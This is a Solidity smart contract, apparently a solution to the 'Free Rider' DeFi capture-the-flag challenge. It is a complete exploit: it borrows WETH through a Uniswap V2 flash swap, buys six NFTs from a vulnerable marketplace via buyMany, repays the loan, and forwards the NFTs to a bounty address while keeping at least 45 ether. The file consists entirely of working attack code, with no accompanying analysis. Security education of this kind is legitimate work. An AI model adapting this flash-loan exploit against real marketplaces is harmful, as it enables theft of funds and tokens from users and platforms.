// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IFlashSwapV2Pair {
      function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
      function token0() external pure returns (address);
      function token1() external pure returns (address);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
}

interface IWETH {
  function deposit() external payable;
  function transfer(address to, uint value) external returns (bool);
  function withdraw(uint) external;
}

interface INFTMarketplace {
  function buyMany(uint256[] calldata tokenIds) external payable;
  function token() external pure returns (ERC721);
}

contract FreeRider is IUniswapV2Callee {
  IFlashSwapV2Pair private immutable _pair;
  INFTMarketplace private immutable _marketplace;
  address private immutable _bounty;
  IWETH private immutable _weth;
  IERC721 private immutable _nft;
  address private immutable _player;

  uint256[] private tokens = [0, 1, 2, 3, 4, 5];

  constructor(address pairAddress, address marketplaceAddress, address bountyAddress, address wethAddress, address nftAddress) {
    _pair = IFlashSwapV2Pair(pairAddress);
    _marketplace = INFTMarketplace(marketplaceAddress);
    _bounty = bountyAddress;
    _weth = IWETH(wethAddress);
    _nft = IERC721(nftAddress);
    _player = msg.sender;
  }

  function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
    require(sender == address(this), "FreeRider: sender must be this contract");
    require(msg.sender == address(_pair), "FreeRider: msg.sender must be pair");
    require(amount0 == 0 || amount1 == 0, "FreeRider: must swap exact amount");

    uint amount = abi.decode(data, (uint256));

    uint256 fee = ((amount * 3) / 997) + 1;
    uint256 amountToRepay = amount + fee;
    
    // unwrap WETH
    _weth.withdraw(amount);

    // buy all nft with 15 eth
    _marketplace.buyMany{value: amount}(tokens);
    
    // wrap enough WETH
    _weth.deposit{value: amountToRepay}();
    _weth.transfer(address(_pair), amountToRepay);

    // claim rewards
    _claimRewards();
    require(address(this).balance >= 45 ether, "FreeRider: balance must be greater than 45 ether");
  }

  function execute(uint amount) external payable {
    address to = address(this);
    require(amount > 0, "FreeRider: amount must be greater than 0");
    bytes memory data = abi.encode(amount);
    _pair.swap(amount, 0, to, data);
  }

  function _claimRewards() internal {
    bytes memory data = abi.encode(_player);
    for (uint256 i = 0; i < tokens.length; i++) {
      _nft.safeTransferFrom(address(this), _bounty, i, data);
    }
  }

  function onERC721Received(address, address, uint256 , bytes memory)
        external
        pure
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }
    
  receive() external payable {}

}